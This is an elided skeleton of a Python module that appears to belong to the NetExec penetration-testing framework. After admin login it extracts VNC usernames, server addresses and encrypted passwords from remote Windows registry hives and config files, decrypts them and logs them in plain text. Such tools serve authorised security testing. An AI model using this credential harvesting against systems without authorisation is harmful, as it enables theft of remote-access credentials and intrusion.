...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        if (
            "NO_REMOTEOPS" in module_options
            and "True" in module_options["NO_REMOTEOPS"]
        ):
    ...
    def on_admin_login(self, context, connection):
        ...
        dploot_conn = upgrade_to_dploot_connection(
            target=target, connection=connection.conn
        )
        ...
        if remote_ops._RemoteOperations__rrp:
            ...
            try:
                ...
                self.context.log.debug(
                    f"Error while querying registry value for {path} {key}: {e}"
                )
    ...
    def vnc_client_proxyconf_extract(self, dploot_conn, remote_ops=None):
        ...
        for user, sid in users.items():
            ...
            try:
                ...
                self.context.log.debug(
                    f"Error while getting NTUSER.DAT file for {user}: {e}"
                )
            for vnc_name, registry_path, registry_keys in vnc_client_softwares:
                ...
                if ntuser_dat_bytes is None and remote_ops is not None:
                    ...
                    try:
                        ...
                        cred["password"] = self.recover_vncpassword(
                            unhexlify(password)
                        ).decode("latin-1")
                        cred["server"] = self.reg_query_value(
                            remote_ops, user_registry_path, registry_keys[2], hku=True
                        )
                        cred["user"] = self.reg_query_value(
                            remote_ops, user_registry_path, registry_keys[0], hku=True
                        )
                    except Exception as e:
                    ...
                    if parent_key is None:
                        continue
                    cred["user"] = reg.getValue(
                        ntpath.join(registry_path, registry_keys[0])
                    )[1].decode("latin-1")
                    password = (
                    ...
                    cred["server"] = reg.getValue(
                        ntpath.join(registry_path, registry_keys[2])
                    )[1].decode("latin-1")

                self.context.log.highlight(
                    f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}"
                )
    ...
    def vnc_from_registry(self, remote_ops):
        ...
        for vnc_name, path, key in vncs:
            try:
                ...
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.context.log.debug(
                        f"Error while RegQueryValue {path}\\{key}: {e}"
                    )
                continue
            if value is None:
                continue
            ...
            if password is None:
                continue
            self.context.log.highlight(
                f"[{vnc_name}] Password: {password.decode('latin-1')}"
            )
        ...
        for vnc_name, path, user, password, server in vnc_users:
            ...
            try:
                value = (
                    self.reg_query_value(remote_ops, path, password)
                    .encode()
                    .rstrip(b"\x00")
                    .decode()
                )
                ...
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.context.log.debug(
                        f"Error while RegQueryValue {path}\\{user}: {e}"
                    )
                continue
            if value is None:
                continue
        ...
        if encpasswd:
            ...
            if len(hexpasswd) > 16 and (len(hexpasswd) % 16) == 0:
                ...
                for sblock in splitstr:
                    cryptedblocks.append(
                        self.decrypt_password(codecs.decode(sblock, "hex"))
                    )
    ...
    def decrypt_password(self, password: bytes):
        ...
        try:
            ...
            self.context.log.debug(
                f"Error while decrypting VNC password {password}: {ex}"
            )
            ...
            if file_content is not None:
                ...
                for regex in regex_passwd:
                    ...
                    for passwd_encrypted in passwds_encrypted:
                        ...
                        password = self.recover_vncpassword(
                            unhexlify(passwd_encrypted)
                        )[:8]
                        self.context.log.highlight(
                            f"[{vnc_name}] Password: {password.decode('latin-1')}"
                        )
    ...
    def get_users(self, conn):
        ...
        for sid in sids:
            ...
            _, profile_path = rrp.hBaseRegQueryValue(
                conn._RemoteOperations__rrp, keyHandle, "ProfileImagePath"
            )
